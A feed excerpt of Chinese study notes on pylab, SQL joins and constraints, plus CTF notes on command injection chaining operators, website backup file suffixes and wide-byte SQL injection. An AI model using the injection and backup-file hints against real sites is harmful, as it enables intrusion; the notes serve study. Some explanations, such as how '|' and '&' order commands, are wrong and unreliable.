id="参数：-1"><a href="#参数：-1" class="headerlink" title="参数："></a>参数：</h2><ol><li>start:序列的起始点</li><li>end:序列的终止点，如果endpoint设置为true,则包含最后一个点（全闭区间）</li><li>num:生成的样本数，默认是50，必须为非负</li></ol><h1 id="网上的大部分解释"><a href="#网上的大部分解释" class="headerlink" title="网上的大部分解释"></a>网上的大部分解释</h1><ol><li>pyplot:方便快速绘图,matplotlib通过pyplot模块提供了与一套和MATLAB类似的绘图API，将众多绘图对象构成的复杂结构隐藏在这套API内部<br> 2， pylab:matplotlib还提供了一个名为pylab的模块，其中包含许多Numpy和pyplot模块中常用的函数</li></ol><h1 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h1><ol><li>pylab = pyplot+大部分numpy</li><li>也就是说pylab只是提供了一个方便的导入常用包的接口</li></ol><h1 id="和matlab的区别："><a href="#和matlab的区别：" class="headerlink" title="和matlab的区别："></a>和matlab的区别：</h1><ol><li>在matlab中，画了一条线以后，如果想接着画另一条线，则需要hold on函数</li><li>python中直接画即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据可视化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于command类题型，ping和waf</title>
      <link href="/%E5%85%B3%E4%BA%8Ecommandping%E5%92%8Cwaf/"/>
      <url>/%E5%85%B3%E4%BA%8Ecommandping%E5%92%8Cwaf/</url>
      
        <content type="html"><![CDATA[<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><ol><li>ping是windows,unix,linux系统下的一个命令，ping也属于一个通信协议，是TCP/IP协议的一部分。</li><li>利用ping命令可以检查网络是否联通，可以很好地帮助我们分析和判断网络故障。</li><li>格式:ping空格IP地址</li></ol><h1 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h1><ol><li><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）</p></li><li><p>waf具备限制对某些url请求次数的能力和限制文件上传功能的能力</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2></li><li><p>|的作用是将前一个命令的执行结果传递给后一个命令作为输入</p></li><li><p>&amp;&amp;的作用是将当前一条命令执行成功时才执行后一条命令</p></li></ol><h3 id="windows-或-linux-下"><a href="#windows-或-linux-下" class="headerlink" title="windows 或 linux 下:"></a>windows 或 linux 下:</h3><h4 id="amp-amp-amp-被称为管道符"><a href="#amp-amp-amp-被称为管道符" class="headerlink" title="| || &amp; &amp;&amp;被称为管道符"></a>| || &amp; &amp;&amp;被称为管道符</h4><ol><li>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</li><li>command1 | command2 只执行 command2（将command1的结果给command2），但是不去执行command1</li><li>command1 &amp; command2 先执行 command2 后执行 command1，注意先后顺序！！！</li><li>command1 || command2 先执行 command1，如果为假，再执行 command2</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ping </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站备份文件后缀</title>
      <link href="/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80/"/>
      <url>/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80/</url>
      
        <content type="html"><![CDATA[<h1 id="常见网站源码备份文件后缀"><a href="#常见网站源码备份文件后缀" class="headerlink" title="常见网站源码备份文件后缀"></a>常见网站源码备份文件后缀</h1><ol><li>“.git” 、“.svn”、“ .swp” “.~”、“.bak”、“.bash_history”、“.bkf”、“.zip”</li><li>也可以是：</li><li><img src="https://img2020.cnblogs.com/blog/2556426/202201/2556426-20220118162112250-42073699.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 网站备份漏洞 </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
            <tag> 网站备份漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白帽子sql注入</title>
      <link href="/%E7%99%BD%E5%B8%BD%E5%AD%90sql%E6%B3%A8%E5%85%A5/"/>
      <url>/%E7%99%BD%E5%B8%BD%E5%AD%90sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h1><h2 id="不同的字符编码也会导致出现一些安全问题"><a href="#不同的字符编码也会导致出现一些安全问题" class="headerlink" title="不同的字符编码也会导致出现一些安全问题"></a>不同的字符编码也会导致出现一些安全问题</h2><h3 id="sql语法中用单引号”‘“作为转义字符"><a href="#sql语法中用单引号”‘“作为转义字符" class="headerlink" title="sql语法中用单引号”‘“作为转义字符"></a>sql语法中用单引号”‘“作为转义字符</h3><ol><li>insert into person(LastName) values(‘O’’R’)</li><li>则输出结果为O’R</li></ol><h3 id="php中的转义为"><a href="#php中的转义为" class="headerlink" title="php中的转义为\"></a>php中的转义为\</h3><h2 id="如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节"><a href="#如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节" class="headerlink" title="如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节"></a>如果进入数据库之前，web语言中没有考虑到双字节字符问题，双字节字符会被认为是两个字节</h2><ol><li>0x 5c和0x bf 5c会被认为是一个字符（双字节字符）</li></ol><h2 id="要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异"><a href="#要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异" class="headerlink" title="要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异"></a>要解决这种问题，需要统一数据库，操作系统，web应用所使用的字符集，避免各层对字符的理解存在差异</h2><ol><li>统一设置为utf-8是一个很好的办法</li></ol><h1 id="mysql中环境变量sql-mode"><a href="#mysql中环境变量sql-mode" class="headerlink" title="mysql中环境变量sql_mode"></a>mysql中环境变量sql_mode</h1><ol><li>定义了mysql应该支持的sql语法，数据校验等</li><li>默认为null，这种设置下可以允许一些非法操作，比如允许一些非法数据的插入</li><li>在生产环境下必须设置为严格模式<h2 id="sql-mode常用来解决的几类问题"><a href="#sql-mode常用来解决的几类问题" class="headerlink" title="sql_mode常用来解决的几类问题"></a>sql_mode常用来解决的几类问题</h2></li><li>通过设置sql_mode，可以完成不同严格程度的数据校验，有效地保证数据准确性；</li><li>通过设置sql_mode为宽松模式，来保证大多数sql符合标准的sql语法，这样应用在不同数据库之间进行迁移时。则不需要对业务sql进行较大的修改；</li><li>在不同数据库之间进行数据迁移之前，通过设置sql_mode可以使MySQL上的数据更方便地迁移到目标数据库中<h2 id="sql-mode包含的模式"><a href="#sql-mode包含的模式" class="headerlink" title="sql_mode包含的模式"></a>sql_mode包含的模式</h2></li><li>ansi模式：宽松模式，对插入数据进行校验，如果不符合定义类型或长度，对数据类型调整或截断保存，爆warning警告</li><li>traditional模式：严格模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，爆error错误</li><li>strict_trans_tables模式：严格模式，进行数据的严格校验，错误数据不能插入，爆error错误</li></ol><h3 id="查看sql-mode的语句："><a href="#查看sql-mode的语句：" class="headerlink" title="查看sql_mode的语句："></a>查看sql_mode的语句：</h3><ol><li><p>use database_name;</p></li><li><p>select @@sql_mode;</p></li><li><p>或者</p></li><li><p>use data_basename;</p></li><li><p>show variables like ‘%sql_mode%’;</p></li><li><p><a href="https://imgtu.com/i/LmrvjS"><img src="https://s1.ax1x.com/2022/04/12/LmrvjS.png" alt="LmrvjS.png"></a></p></li><li><p>结论：在STRICT_TRANS_TABLES模式下，插入数据时，mysql会严格的进行数据的校验，当发现插入列值未满足要求，直接报告error错误，保证了错误数据无法插入到数据库中</p></li><li><p>结论：</p></li><li><p>严格模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，报error错误，而不仅仅是警告。用于事务时，会进行事务的回滚。</p></li><li><p>一旦发现错误立即放弃INSERT/UPDATE。如果你使用非事务存储引擎，这种方式不是你想要的，因为出现错误前进行的数据更改不会“滚动”，结果是更新“只进行了一部分”。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql查询</title>
      <link href="/sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5/"/>
      <url>/sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>from字句后面的表名，可以用表原名，也可以为它起别名，一旦有了别名，整个查询语句中凡是涉及用表名的地方都要用表原名</li><li>查询语句中出现的所有列，若在所有涉及的表中是唯一的，则列明前可以不加表明前缀</li><li>如果不是唯一的，为了确定它的唯一性，<strong>必须在列名前加表名前缀</strong></li></ol><h2 id="等值连接和非等值连接"><a href="#等值连接和非等值连接" class="headerlink" title="等值连接和非等值连接"></a>等值连接和非等值连接</h2><ol><li>两个表进行连接时，必须要有可比字段，两个可比字段的值进行逐一比较来决定当前两个元组是否可以连接</li><li>等值连接不会去重<pre class="line-numbers language-none"><code class="language-none">select student.*,SC.*from student,SCwhere student.sno &#x3D; SC.sno;select SC.sno,SC.score,SG.gradefrom SC,SGwhere SC.score BETWEEN SG.minscore AND SG.maxscore;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h2><h3 id="显示内连接"><a href="#显示内连接" class="headerlink" title="显示内连接"></a>显示内连接</h3><ol><li>on来连接两个连接列，where中写连接条件</li><li>显示内连接用inner join</li><li>内连接又叫自然连接，会去掉重复列的等值连接<pre class="line-numbers language-none"><code class="language-none">select 目标列列表from 表1 inner join 表2on 表1.连接列&#x3D;表2.连接列where 查询条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="隐式内连接"><a href="#隐式内连接" class="headerlink" title="隐式内连接"></a>隐式内连接</h3><ol><li>where写连接列，and后跟条件</li><li>隐式内连接用’=’<pre class="line-numbers language-none"><code class="language-none">select 目标列列表from 表1，表2where 表1.连接字段&#x3D;表2.连接字段and 其它查询条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><h3 id="左外连接"><a href="#左外连接" class="headerlink" title="左外连接"></a>左外连接</h3><ol><li>以左边的表为基础，根据ON后面给出的两表的条件将两表连接起来</li><li>结果会将左表所有查询信息列出，右表只会列出ON后条件和左表满足的部分</li><li>语句left join… on<pre class="line-numbers language-none"><code class="language-none">select a.device_id,question_id,result,level,gender,agefrom(    select device_id,question_id,result,level    from question_practice_detail)a-表别名left join(    select device_id,gender,age    from user_profile)b-表别名on a.device_id&#x3D;b.device_id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/14/MH8AP7neVJtcExF.png"><h3 id="左外连接的注意事项"><a href="#左外连接的注意事项" class="headerlink" title="左外连接的注意事项"></a>左外连接的注意事项</h3></li><li>在使用left join时，写在前面的表为匹配时的底表，使用on给出匹配条件，<strong>匹配条件可以不唯一</strong></li><li>在表匹配时，一般我们会将要匹配的两段查询用括号括起来，并在<strong>括号末尾给予一串字母</strong>，作为表的别名</li></ol><h4 id="左外连接例题"><a href="#左外连接例题" class="headerlink" title="左外连接例题"></a>左外连接例题</h4><pre class="line-numbers language-none"><code class="language-none">select    university,    difficult_level,    round(count(qpd.question_id) &#x2F; count(distinct qpd.device_id),4) as avg_answer_cnt-- round(x,4)将x四舍五入至小数点后四位    from question_practice_detail as qpdleft join user_profile as upon up.device_id&#x3D;qpd.device_idleft join question_detail as qdon qd.question_id&#x3D;qpd.question_idgroup by university,difficult_level;-- group by university按学校分组，group by difficult_level按不同难度的用户平均答题量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/14/H3ScumMxIbJQnBT.png"><br><img src="https://s2.loli.net/2022/05/14/2gbWteK8NRLpX3Y.png"></p><h3 id="右外连接"><a href="#右外连接" class="headerlink" title="右外连接"></a>右外连接</h3><ol><li>左外连接的反向连接<pre class="line-numbers language-none"><code class="language-none">Select a.device_id,question_id,result,level,gender,agefrom(Select device_id,gender,ageFrom user_profile)a -- 表别名Right join(Select device_id,question_id,result,levelFrom question_practice_detail)b -- 表别名On a.device_id &#x3D; b.device_id —给出链接条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="全外连接"><a href="#全外连接" class="headerlink" title="全外连接"></a>全外连接</h3></li><li>将左右两个表先左外连接，在右外连接，然后两个结果并在一起<pre class="line-numbers language-none"><code class="language-none">select 目标列列表from 表1 full join 表2on 表1.链接列&#x3D;表2.链接列where 查询条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="自身链接"><a href="#自身链接" class="headerlink" title="自身链接"></a>自身链接</h3><ol><li>链接操作不仅可以在多个表之间进行链接，而且可以时一个表与其自身进行连接，这样的表称为自身连接</li><li>因为两个表的表名和列名都相同，为了加以区分，必须给他们起两个别名，且各列前<strong>必须要有****表别名前缀</strong><pre class="line-numbers language-none"><code class="language-none">select FIRST.cno,SECOND.cpnofrom course FIRST inner join course SECONDon FIRST.cpno &#x3D; SECOND.cno;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><ol><li>在写表和表的连接关系时，大多数情况下都必须要限制匹配条件，如果在匹配时没有限制匹配条件，这时就会导致笛卡尔积。</li><li>笛卡尔积时关系代数里一个概念，表示两个表中的每一行数据任意组合</li><li>假设A中有n行数据，b中有m行数据，没有限制匹配条件的话，最终输出的结果就会有n*m行数据</li><li>在互联网大体量数据情况下，每个表 可能有几百万几千万行数据，几千万*几千万最终得到的结果行数会是天文数字，所以在写匹配时，一定不要忘了加上匹配条件。</li></ol><h1 id="全称量词命题和存在量词命题"><a href="#全称量词命题和存在量词命题" class="headerlink" title="全称量词命题和存在量词命题"></a>全称量词命题和存在量词命题</h1><p><img src="https://s2.loli.net/2022/05/15/C8n7jA3FNu4BTcI.png"><br><img src="https://s2.loli.net/2022/05/15/jnP8qkXrQzlxcJ7.png"></p><h1 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h1><h2 id="嵌套查询的工作方式"><a href="#嵌套查询的工作方式" class="headerlink" title="嵌套查询的工作方式"></a>嵌套查询的工作方式</h2><ol><li>先处理内查询，由内向外处理</li><li>外层查询利用内层查询的结果<br><img src="https://s2.loli.net/2022/05/15/GIv4x7RsuibCVPM.png"><pre class="line-numbers language-none"><code class="language-none">select tag,count(tag) as tag_cntfrom exam_recordjoin examination_info on exam_record.exam_id &#x3D; examination_info.exam_idwhere uid in (    select uid    from exam_record    where submit_time is not null    group by score    having count(exam_id) &#x2F; count(distinct DATE_FORMAT(start_time,&quot;%Y%m&quot;)) &gt;&#x3D; 3)group by tagorder by tag_cnt desc;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/15/b49OdtZRJVKMaox.png"><br><img src="https://s2.loli.net/2022/05/15/1pJmxVgWicM7wB2.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql中的NUMBER数据类型</title>
      <link href="/sql%E4%B8%ADnumber%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/sql%E4%B8%ADnumber%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="NUMBER"><a href="#NUMBER" class="headerlink" title="NUMBER"></a>NUMBER</h1><ol><li>可以存储零值，正负数，定长数</li></ol><h2 id="表示范围和存储空间"><a href="#表示范围和存储空间" class="headerlink" title="表示范围和存储空间"></a>表示范围和存储空间</h2><ol><li>从从1.0 x 10-130 到 1.0 x 10126(不包括)，如果表达式或值大于1.0 x 10126，Oracle会返回错误信息</li></ol><h2 id="NUMBER类型表示方法"><a href="#NUMBER类型表示方法" class="headerlink" title="NUMBER类型表示方法"></a>NUMBER类型表示方法</h2><ol><li>number(p,s) p和s可选</li><li>其中p表示数字的总长度，s表示可以有几位小数</li><li>precision叫精度，数中总数字的个数，默认为38位</li><li>scale是小数位数，即数中小数点右边的数字个数</li></ol><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ol><li>number数据类型只存在于Oracle中，不存在于MySQL中</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql中表级别的约束和列级别的约束</title>
      <link href="/sql%E4%B8%AD%E8%A1%A8%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%92%8C%E5%88%97%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F/"/>
      <url>/sql%E4%B8%AD%E8%A1%A8%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%92%8C%E5%88%97%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BA%A6%E6%9D%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="sql中表级别的约束和列级别的约束"><a href="#sql中表级别的约束和列级别的约束" class="headerlink" title="sql中表级别的约束和列级别的约束"></a>sql中表级别的约束和列级别的约束</h1><h2 id="列级别的约束有六种："><a href="#列级别的约束有六种：" class="headerlink" title="列级别的约束有六种："></a>列级别的约束有六种：</h2><ol><li>primary key</li><li>foreign key</li><li>unique</li><li>check</li><li>default</li><li>not null/null</li></ol><h1 id="表级别的约束"><a href="#表级别的约束" class="headerlink" title="表级别的约束"></a>表级别的约束</h1><ol><li>主键</li><li>外键</li><li>唯一</li><li>检查</li></ol><h1 id="列约束的定义"><a href="#列约束的定义" class="headerlink" title="列约束的定义"></a>列约束的定义</h1><ol><li><p>直接跟在该列的其他定义之后，用空格分割，不必指定列名</p></li><li><p>表约束和列定义相互独立，不包括在列定义中，通常用于对多个列一起进行约束，与列定义用“，”分割，定义表约束时必须指出要约束的哪些列的名称，完整性约束的基本语法格式时[CONSTANT &lt;约束名&gt;] &lt;约束类型&gt;</p><pre><code> CREATE TABLE g1 &#123;     g_id CHAR(6) PRIMARY KEY     g_name VARCHAR(20) &#125;</code></pre><p>或</p><pre><code> CREATE TABLE stu &#123;     s_id CHAR(10)     CONSTRAINT pk PRIMARY KEY(s_id) &#125;</code></pre></li></ol><h1 id="完整性概念"><a href="#完整性概念" class="headerlink" title="完整性概念"></a>完整性概念</h1><h2 id="域完整性"><a href="#域完整性" class="headerlink" title="域完整性"></a>域完整性</h2><ol><li>域完整性是对数据表中字段属性的约束<h2 id="实体完整性"><a href="#实体完整性" class="headerlink" title="实体完整性"></a>实体完整性</h2></li><li>通过主键约束和候选键约束实现<h2 id="参照完整性"><a href="#参照完整性" class="headerlink" title="参照完整性"></a>参照完整性</h2></li><li>MySQL中的外键</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql常见的建表选项和约束</title>
      <link href="/mysql%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BB%BA%E8%A1%A8%E9%80%89%E9%A1%B9%E5%92%8C%E7%BA%A6%E6%9D%9F/"/>
      <url>/mysql%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BB%BA%E8%A1%A8%E9%80%89%E9%A1%B9%E5%92%8C%E7%BA%A6%E6%9D%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="create-table选项"><a href="#create-table选项" class="headerlink" title="create table选项"></a>create table选项</h1><h2 id="指定列选项：default"><a href="#指定列选项：default" class="headerlink" title="指定列选项：default"></a>指定列选项：default</h2><ol><li>当插入一个新行到表中并且没有给该列明确赋值时，如果定义了列的默认值，将自动得到默认值 ；如果没有，则为null。</li><li>sex char(1) default ‘m’</li><li>当然，也可以在INSERT和UPDATE语句中使用DEFAULT关键字显式地给列赋默认值：</li><li>函数default(column)可以得到一个列的默认值：select default(sex) from people;</li></ol><h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><ol><li>用来给列加注释，最多255个字符，注释会保存到数据字典中</li><li>id int not null primary key</li><li><pre><code>comment &#39;学号&#39;</code></pre><h3 id="从数据字典中查询注释信息"><a href="#从数据字典中查询注释信息" class="headerlink" title="从数据字典中查询注释信息"></a>从数据字典中查询注释信息</h3></li><li>select column_name,column_comment</li><li>from information_schema.columns</li><li>where table_name=’stu_comment’</li></ol><h1 id="在CREATE-TABLES语句中的表选项"><a href="#在CREATE-TABLES语句中的表选项" class="headerlink" title="在CREATE TABLES语句中的表选项"></a>在CREATE TABLES语句中的表选项</h1><h2 id="engine-指定表使用的存储引擎"><a href="#engine-指定表使用的存储引擎" class="headerlink" title="engine:指定表使用的存储引擎"></a>engine:指定表使用的存储引擎</h2><ol><li>存储引擎：决定了数据如何存储以及如何访问，还有事务如何处理</li><li>show engines 用来查询所有支持的存储引擎</li></ol><h1 id="CREATE-TABLE约束"><a href="#CREATE-TABLE约束" class="headerlink" title="CREATE TABLE约束"></a>CREATE TABLE约束</h1><h2 id="作用：可以为列定义约束"><a href="#作用：可以为列定义约束" class="headerlink" title="作用：可以为列定义约束"></a>作用：可以为列定义约束</h2><ol><li>约束主要是防止非法数据进入表中，保证数据的正确性和一致性，统称为数据完整性</li><li>约束也可以防止一个表被删除</li></ol><h2 id="MySQL的约束保存在information-schema-table-constraints中，可以通过该表查询约束信息"><a href="#MySQL的约束保存在information-schema-table-constraints中，可以通过该表查询约束信息" class="headerlink" title="MySQL的约束保存在information_schema.table_constraints中，可以通过该表查询约束信息"></a>MySQL的约束保存在information_schema.table_constraints中，可以通过该表查询约束信息</h2><h2 id="常见的约束类型"><a href="#常见的约束类型" class="headerlink" title="常见的约束类型"></a>常见的约束类型</h2><ol><li>not null非空，指定某列不为空（注意区分空和空格的关系）</li><li>unique：唯一约束，指定某列和几列组合的数据不能重复</li><li>primary key:主键约束，指定某列的数据不能重复，唯一</li><li>foreign key:外键，指定该列记录属于主表中的一条记录，参照另一条记录</li><li>check：检查，指定一个表达式，用于检验指定数据</li></ol><h3 id="primary-key-not-null-unique"><a href="#primary-key-not-null-unique" class="headerlink" title="primary key = not null + unique"></a>primary key = not null + unique</h3><ol><li>主键是用来唯一标识表中的每一行，类型一般为整型或者字符串</li><li>具有主键约束的列不允许有null值，不允许有重复值</li><li>每个表最多只允许一个主键，可定义联合主键，主键名总是PRIMARY</li></ol><h4 id="联合主键"><a href="#联合主键" class="headerlink" title="联合主键"></a>联合主键</h4><ol><li>用几个列来进行唯一标识一行<pre><code> constraint pk_id_name primary_key(id,name)</code></pre></li><li>constraint可以给键进行重命名，但是在数据字典中，主键名还是显示primary</li></ol><h3 id="foreign-key外键约束"><a href="#foreign-key外键约束" class="headerlink" title="foreign key外键约束"></a>foreign key外键约束</h3><ol><li>参照完整性约束，保证一个或两个表之间的参照完整性，外键是构建于一个表的两个字段或者是两个表的两个字段之间的参照关系<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4></li><li>具有外键约束的列的值不能随便给，必须满足外键所引用的主键的取值</li><li>一张表中可以定义多个外键</li><li>外键列默认可以给null值<h3 id="父子表"><a href="#父子表" class="headerlink" title="父子表"></a>父子表</h3></li><li>外键所在的表叫做子表，从表</li><li>外键所引用的主键所在的表叫做父表，主表<pre><code> constraint emp_deptid_fk foreign_key(deptid) references dept(deptid)</code></pre><h4 id="外键的删除规则"><a href="#外键的删除规则" class="headerlink" title="外键的删除规则"></a>外键的删除规则</h4></li><li>当删除父表中的行时，如果子表中有依赖被删除的父行的子行存在，那么就不允许删除，并抛出异常（默认对外键使用on delete restrict或on delete no action选项）</li><li>在定义外键约束时，可以通过使用on delete cascade或on delete set null来改变外加的默认删除规则</li><li>on delete cascade：级联删除，当删除父表中的行时，如果子表中有依赖于被删除父行的子行存在，那么联通子行一起删除，相当于rm -f</li><li>on delete set null：当删除父表中的行时，如果子表中有依赖于被删除的父行的子行存在，那么不删除，而是将子行的外键设置为null<h4 id="外键引用定义"><a href="#外键引用定义" class="headerlink" title="外键引用定义"></a>外键引用定义</h4><pre><code> reference_definition:     REFERENCES tbl_name (index_col_name,...)     [MATCH FULL | MATCH PARTIAL | MATCH SIMPLE]     [ON DELETE reference_option]     [ON UPDATE reference_option] reference_option:     RESTRICT | CASCADE | SET NULL | NO ACTION</code></pre></li></ol><h3 id="check约束"><a href="#check约束" class="headerlink" title="check约束"></a>check约束</h3><ol><li><p>MySQl中可以使用check约束，但是check约束对数据验证没有任何作用。</p></li><li><p>Oracle中国可以使用check约束，有相应作用</p><pre><code> mysql&gt; create table test_ck(     -&gt;   id int check(id&gt;0)     -&gt; ); mysql&gt; insert into test_ck values(-100); mysql&gt; select * from test_ck; +------+ | id   | +------+ | -100 | +------+</code></pre></li><li><p>也可以使用ENUM和set来变通地实现check约束，ENUM只能选一个值，SET可以选择多个值</p></li></ol><h3 id="AUTO-INCREMENT"><a href="#AUTO-INCREMENT" class="headerlink" title="AUTO_INCREMENT"></a>AUTO_INCREMENT</h3><ol><li>自增</li><li>缺点：当删除上一条时会在删除的上一条的基础上加1，不会覆盖原来删除的编号</li><li>列的数值自动增长，列的类型只能是整数类型</li><li>通常给主键添加自增长约束</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql约束</title>
      <link href="/create%20tables%E9%80%89%E9%A1%B9/"/>
      <url>/create%20tables%E9%80%89%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="create-tables选项"><a href="#create-tables选项" class="headerlink" title="create tables选项"></a>create tables选项</h1><h2 id="定义列的时候，指定列选项"><a href="#定义列的时候，指定列选项" class="headerlink" title="定义列的时候，指定列选项"></a>定义列的时候，指定列选项</h2><h2 id="约束的概念"><a href="#约束的概念" class="headerlink" title="约束的概念"></a>约束的概念</h2><ol><li>对表中的数据进行限定，保证数据的正确性。有效性和完整性<h3 id="DEFAULT-定义列的默认值"><a href="#DEFAULT-定义列的默认值" class="headerlink" title="DEFAULT 定义列的默认值"></a>DEFAULT 定义列的默认值</h3></li><li>当插入一个新行到表中并且没有给该列明确赋值时，如果定义了列的默认值，将自动得到默认值，如果没有为null</li><li>sex char(1) default ‘m’</li></ol><h3 id="COMMENT-用来给列添加注释，最多255个字符，注释保存到数据字典中"><a href="#COMMENT-用来给列添加注释，最多255个字符，注释保存到数据字典中" class="headerlink" title="COMMENT 用来给列添加注释，最多255个字符，注释保存到数据字典中"></a>COMMENT 用来给列添加注释，最多255个字符，注释保存到数据字典中</h3><ol><li>创建带有列注释的表stu_comment<br>create table stu_comment(<br> id int not null primary key,<br> comment ‘学号’<br> name varchar(20) not null,<br> comment ‘姓名’<br>);<h4 id="从数据字典查询注释信息"><a href="#从数据字典查询注释信息" class="headerlink" title="从数据字典查询注释信息"></a>从数据字典查询注释信息</h4></li><li>select comumn_name,column_comment</li><li>from information_schema.columns</li><li>where table_name=’stu_comment’</li></ol><h1 id="常见的约束类型"><a href="#常见的约束类型" class="headerlink" title="常见的约束类型"></a>常见的约束类型</h1><ol><li>not null 非空类型，指定某列不为空</li><li>unique 唯一约束，指定某列和几列组合的数据不能重复</li><li>primary key 主键约束，指定某列的数据不能重复</li><li>foreign key 外键,指定该列记录属于主表中的一条记录，参照另一条数据</li><li>check 检查，指定一个表达式，用于检验指定数据</li></ol><p>CREATE TABLE table_name(<br>    column_name datetype [not null] [unique key] [primary key] [check(expr)]<br>);</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>foreign key用法详解</title>
